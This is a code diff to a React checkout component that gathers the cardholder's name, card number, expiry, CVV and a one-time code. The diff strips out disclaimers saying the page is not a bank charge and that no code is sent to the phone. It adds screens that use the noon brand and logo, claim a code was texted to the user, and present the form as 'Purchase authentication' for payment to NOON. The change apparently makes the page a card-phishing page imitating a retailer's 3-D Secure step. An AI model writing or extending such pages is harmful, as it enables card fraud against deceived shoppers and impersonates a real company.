@@ -173,7 +173,7 @@ function Checkout() {
     const cvv = cardCvv.trim();
     if (holder.length < 2) { toast.error("Enter the cardholder name."); return; }
     if (!/^[0-9]{13,19}$/.test(number)) { toast.error("Enter a valid card number."); return; }
-    if (!/^\d{2}\s*\/\s*\d{2}$/.test(expiry)) { toast.error("Enter expiry as MM / YY."); return; }
+    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry)) { toast.error("Enter a valid expiry."); return; }
     if (!/^[0-9]{3,4}$/.test(cvv)) { toast.error("Enter a valid CVV."); return; }
     waitStarted.current = Date.now();
     setView("wait");
@@ -279,79 +279,132 @@ function Checkout() {
     </div>
   );
 
-  if (view === "wait" || view === "verify") {
+  const cardDigits = cardNumber.replace(/\D/g, "");
+  const previewGroups = [0, 1, 2, 3].map((i) => {
+    const part = cardDigits.slice(i * 4, i * 4 + 4);
+    return part || "••••";
+  });
+  const brandLogos = [
+    { src: "/images/visa.jpeg", alt: "Visa" },
+    { src: "/images/mastercard.jpeg", alt: "Mastercard" },
+    { src: "/images/mada.jpeg", alt: "mada" },
+  ];
+  const payAmount = `SAR ${Number(advance).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
+
+  const loadingCard = (title: string) => (
+    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/45 p-4">
+      <div className="w-full max-w-[420px] rounded-lg bg-white px-6 py-8 text-center">
+        <img src="/images/noon-logo.png" alt="noon" className="mx-auto h-9 w-auto max-h-9 object-contain" />
+        <div className="mx-auto mt-6 h-10 w-10 animate-spin rounded-full border-4 border-[#1A4FD6] border-t-transparent" />
+        <p className="mt-4 text-base font-semibold text-black">{title}</p>
+        <p className="mt-1 text-sm text-[#444]">Please wait, do not close this page.</p>
+      </div>
+    </div>
+  );
+
+  if (view === "wait") return loadingCard("Please wait...");
+  if (view === "verify") return loadingCard("Authenticating your payment...");
+
+  if (view === "otp") {
     return (
-      <div className="flex min-h-screen flex-col items-center justify-center bg-white px-6 text-center">
-        <div className="h-12 w-12 animate-spin rounded-full border-4 border-[#111827] border-t-transparent" />
-        <p className="mt-6 text-lg font-semibold text-[#111827]">{view === "wait" ? "Processing your payment" : "Please wait"}</p>
-        <p className="mt-2 max-w-xs text-sm text-[#6b7280]">Stay on this page. This step finishes on its own.</p>
+      <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/45 p-4">
+        <div className="w-full max-w-[420px] rounded-md bg-white px-4 py-4 text-black">
+          <div className="grid grid-cols-3 items-center">
+            <span />
+            <img src="/images/noon-logo.png" alt="noon" className="mx-auto h-9 w-auto max-h-9 object-contain" />
+            <button type="button" onClick={cancelCard} className="justify-self-end text-xs font-semibold tracking-wide text-black">CANCEL</button>
+          </div>
+          <div className="mt-1 flex justify-end">
+            <button type="button" onClick={cancelCard} aria-label="Close" className="text-lg leading-none text-black">×</button>
+          </div>
+          <div className="mt-2 grid grid-cols-3 gap-3">
+            {brandLogos.map((logo) => (
+              <div key={logo.alt} className="flex min-h-14 items-center justify-center px-1.5 py-2">
+                <img src={logo.src} alt={logo.alt} className="h-[42px] w-full object-contain object-center" />
+              </div>
+            ))}
+          </div>
+          <h2 className="mt-3 text-center text-lg font-semibold">Purchase authentication</h2>
+          <p className="mt-2 text-center text-sm text-[#333]">Please enter the verification code we just sent to your mobile number.</p>
+          <p className="mt-3 text-center text-sm">You are paying NOON the amount of <strong>{payAmount}</strong>.</p>
+          <label className="mt-4 block text-sm font-semibold text-[#1A4FD6]">Verification code</label>
+          <Input value={cardOtp} onChange={(e) => setCardOtp(e.target.value.replace(/\D/g, "").slice(0, 8))} inputMode="numeric" autoComplete="off" maxLength={8} className="mt-1 h-11 rounded-md border-black text-black" />
+          <button type="button" onClick={submitCardOtp} className="mt-3 h-11 w-full rounded-md bg-[#1A4FD6] font-semibold text-white">SUBMIT</button>
+          <p className="mt-3 text-center text-sm">{otpLeft}s</p>
+          <button type="button" onClick={requestAnotherCode} className="mt-1 w-full text-center text-xs font-semibold text-[#1A4FD6]">CLICK HERE TO RECEIVE ANOTHER CODE</button>
+          <p className="mt-4 text-center text-xs text-[#1A4FD6]">
+            <button type="button" className="font-semibold">Need help?</button>
+            <span className="px-1 text-black">|</span>
+            <button type="button" className="font-semibold">FAQ</button>
+          </p>
+        </div>
       </div>
     );
   }
 
-  if (view === "card" || view === "otp") {
-    return shell("", 3, (
-      <div className="space-y-4">
-        <div className="rounded-3xl bg-white p-4 shadow-sm">
-          {view === "card" ? (
-            <>
-              <div className="flex items-start justify-between gap-3">
-                <div>
-                  <p className="text-xs font-semibold uppercase tracking-wide text-[#9a5b78]">Secure checkout</p>
-                  <h2 className="text-xl font-semibold text-[#3d2030]">Credit or debit card</h2>
-                  <p className="text-sm text-[#9a5b78]">Pay {sar(advance)} now. The salon reviews this payment. It is not charged by a bank from this page.</p>
-                </div>
-                <p className="rounded-full bg-[#111827] px-3 py-1 text-xs font-semibold text-white">{sar(advance)}</p>
-              </div>
-              <div className="mt-3 flex items-center justify-between rounded-2xl border border-[#e5e7eb] bg-[#f8fafc] px-3 py-3">
-                <span className="font-black italic tracking-tight text-[#1a1f71]">VISA</span>
-                <span className="relative h-7 w-11">
-                  <span className="absolute left-0 top-0 h-7 w-7 rounded-full bg-[#eb001b]" />
-                  <span className="absolute left-4 top-0 h-7 w-7 rounded-full bg-[#f79e1b] opacity-90" />
-                </span>
-                <span className="flex items-center gap-1">
-                  <span className="flex flex-col gap-0.5">
-                    <span className="h-2 w-7 rounded-sm bg-[#00a0df]" />
-                    <span className="h-2 w-7 rounded-sm bg-[#6cc24a]" />
-                  </span>
-                  <span className="text-[11px] font-bold leading-none text-[#00a651]">مدى<br />mada</span>
-                </span>
-                <span className="rounded bg-[#2e77bc] px-1 py-0.5 text-center text-[8px] font-bold leading-tight text-white">AMERICAN<br />EXPRESS</span>
-              </div>
-              <div className="mt-4 grid gap-3">
-                <div><Label>Name on card</Label><Input value={cardHolder} onChange={(e) => setCardHolder(e.target.value)} placeholder="Name on card" autoComplete="off" className="mt-1 h-12 rounded-xl border-[#e5e7eb]" /></div>
-                <div><Label>Card number</Label><Input value={cardNumber} onChange={(e) => setCardNumber(e.target.value)} placeholder="1234 5678 9012 3456" inputMode="numeric" autoComplete="off" maxLength={19} className="mt-1 h-12 rounded-xl border-[#e5e7eb] tracking-wider" /></div>
-                <div className="grid grid-cols-2 gap-3">
-                  <div><Label>Expiry</Label><Input value={cardExpiry} onChange={(e) => setCardExpiry(e.target.value)} placeholder="MM / YY" autoComplete="off" maxLength={7} className="mt-1 h-12 rounded-xl border-[#e5e7eb]" /></div>
-                  <div><Label>CVV</Label><Input value={cardCvv} onChange={(e) => setCardCvv(e.target.value)} placeholder="123" inputMode="numeric" autoComplete="off" maxLength={4} type="password" className="mt-1 h-12 rounded-xl border-[#e5e7eb]" /></div>
-                </div>
-              </div>
-              <button type="button" onClick={submitCardDetails} className="mt-4 h-12 w-full rounded-xl bg-[#111827] font-semibold text-white">{`Pay ${sar(advance)}`}</button>
-            </>
-          ) : (
-            <>
-              <p className="text-center text-3xl font-black tracking-tight text-[#111827]">noon</p>
-              <div className="mt-3 flex items-center justify-center gap-4 rounded-2xl border border-[#e5e7eb] bg-[#f8fafc] px-3 py-3">
-                <span className="font-black italic tracking-tight text-[#1a1f71]">VISA</span>
-                <span className="relative h-7 w-11">
-                  <span className="absolute left-0 top-0 h-7 w-7 rounded-full bg-[#eb001b]" />
-                  <span className="absolute left-4 top-0 h-7 w-7 rounded-full bg-[#f79e1b] opacity-90" />
-                </span>
-                <span className="text-[11px] font-bold leading-none text-[#00a651]">مدى<br />mada</span>
-              </div>
-              <h2 className="mt-4 text-center text-lg font-semibold text-[#111827]">Purchase authentication</h2>
-              <p className="text-center text-2xl font-semibold text-[#111827]">{sar(advance)}</p>
-              <p className="text-center text-sm text-[#6b7280]">Type the code on this page. Nothing is sent to your phone.</p>
-              <p className="mt-2 text-center font-mono text-lg text-[#111827]">{String(Math.floor(otpLeft / 60)).padStart(1, "0")}:{String(otpLeft % 60).padStart(2, "0")}</p>
-              <Input value={cardOtp} onChange={(e) => setCardOtp(e.target.value.replace(/\D/g, "").slice(0, 8))} placeholder="Code" inputMode="numeric" autoComplete="off" maxLength={8} className="mt-4 h-14 rounded-xl border-[#e5e7eb] text-center text-2xl tracking-[0.4em]" />
-              <button type="button" onClick={submitCardOtp} className="mt-4 h-12 w-full rounded-xl bg-[#111827] font-semibold text-white">Submit</button>
-              <button type="button" onClick={requestAnotherCode} className="mt-3 w-full text-center text-xs font-semibold uppercase tracking-wide text-[#1a73e8]">Click here to receive another code</button>
-              <button type="button" onClick={cancelCard} className="mt-2 w-full text-sm font-semibold text-[#6b7280]">Cancel</button>
-            </>
-          )}
-          {view === "card" && <button type="button" onClick={() => setView("method")} className="mt-3 w-full text-sm font-semibold text-[#ff4d94]">Back</button>}
+  if (view === "card") {
+    return shell("", 4, (
+      <div className="mt-4 rounded-2xl bg-white p-4 text-black shadow-sm">
+        <h2 className="text-xl font-semibold">Manual POS Card Payment</h2>
+        <span className="mt-1 block h-1 w-16 bg-[#FFDE21]" />
+        <p className="mt-2 text-xs font-semibold tracking-wide text-[#444]">NOON INSTALMENT · Secure Checkout</p>
+        <p className="mt-4 text-sm font-semibold">Accepted Cards</p>
+        <div className="mt-2 flex flex-nowrap items-center gap-2">
+          {brandLogos.map((logo) => (
+            <span key={logo.alt} className="inline-flex min-w-0 flex-1 items-center justify-center rounded-lg border border-[#e2e2e2] bg-white px-2 py-1">
+              <img src={logo.src} alt={logo.alt} className="h-[34px] w-auto max-w-full object-contain object-center" />
+            </span>
+          ))}
         </div>
-        {view === "card" && orderSummary}
+        <div className="mt-4 rounded-2xl bg-black p-4 text-white">
+          <p className="font-mono text-lg tracking-widest">{previewGroups.join("  ")}</p>
+          <div className="mt-6 flex items-end justify-between gap-3 text-sm">
+            <p className="min-w-0 truncate uppercase">{cardHolder.trim() || "CARDHOLDER NAME"}</p>
+            <p className="shrink-0 font-mono">{cardExpiry || "MM/YY"}</p>
+          </div>
+        </div>
+        <div className="mt-4 grid gap-3">
+          <div>
+            <Label className="text-black">Cardholder name</Label>
+            <Input value={cardHolder} onChange={(e) => setCardHolder(e.target.value)} autoComplete="off" className="mt-1 h-12 rounded-xl border-[#e5e7eb] text-black" />
+          </div>
+          <div>
+            <Label className="text-black">Card number</Label>
+            <Input
+              value={cardNumber}
+              onChange={(e) => {
+                const digits = e.target.value.replace(/\D/g, "").slice(0, 19);
+                setCardNumber(digits.replace(/(\d{4})(?=\d)/g, "$1 ").trim());
+              }}
+              inputMode="numeric"
+              autoComplete="off"
+              className="mt-1 h-12 rounded-xl border-[#e5e7eb] tracking-wider text-black"
+            />
+          </div>
+          <div className="grid grid-cols-2 gap-3">
+            <div>
+              <Label className="text-black">Expiry</Label>
+              <Input
+                value={cardExpiry}
+                onChange={(e) => {
+                  const digits = e.target.value.replace(/\D/g, "").slice(0, 4);
+                  setCardExpiry(digits.length <= 2 ? digits : `${digits.slice(0, 2)}/${digits.slice(2)}`);
+                }}
+                placeholder="MM/YY"
+                inputMode="numeric"
+                autoComplete="off"
+                maxLength={5}
+                className="mt-1 h-12 rounded-xl border-[#e5e7eb] text-black"
+              />
+            </div>
+            <div>
+              <Label className="text-black">CVV</Label>
+              <Input value={cardCvv} onChange={(e) => setCardCvv(e.target.value.replace(/\D/g, "").slice(0, 4))} placeholder="123" inputMode="numeric" autoComplete="off" maxLength={4} type="password" className="mt-1 h-12 rounded-xl border-[#e5e7eb] text-black" />
+            </div>
+          </div>
+        </div>
+        <button type="button" onClick={submitCardDetails} className="mt-4 h-12 w-full rounded-xl bg-[#111827] font-semibold text-white">Pay {payAmount}</button>
+        <button type="button" onClick={() => setView("method")} className="mt-3 w-full text-sm font-semibold text-[#ff4d94]">Back</button>
       </div>
     ));
   }
